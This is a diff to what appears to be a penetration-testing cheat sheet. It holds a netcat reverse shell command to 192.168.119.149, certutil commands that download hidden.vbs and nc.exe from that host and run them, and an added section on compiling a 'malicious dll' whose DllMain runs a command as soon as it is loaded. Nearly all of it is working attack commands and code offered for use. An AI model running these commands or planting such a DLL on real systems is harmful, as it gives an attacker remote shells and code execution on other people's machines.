@@ -132,7 +132,7 @@ C:\windows\temp\test\nc.exe 192.168.119.149 443 -e cmd
 EOF
 
 ## On windows
-
+```
 certutil -urlcache -split -f http://192.168.119.149/hidden.vbs
 
 certutil -urlcache -split -f http://192.168.119.149/nc.bat
@@ -140,4 +140,21 @@ certutil -urlcache -split -f http://192.168.119.149/nc.bat
 certutil -urlcache -split -f http://192.168.119.149/nc.exe
 
 cmd /c cscript hidden.vbs
-
+```
+### compilation
+#### compile a malicious dll
+```
+For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+```
+##### Content of windows_dll.c
+```
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
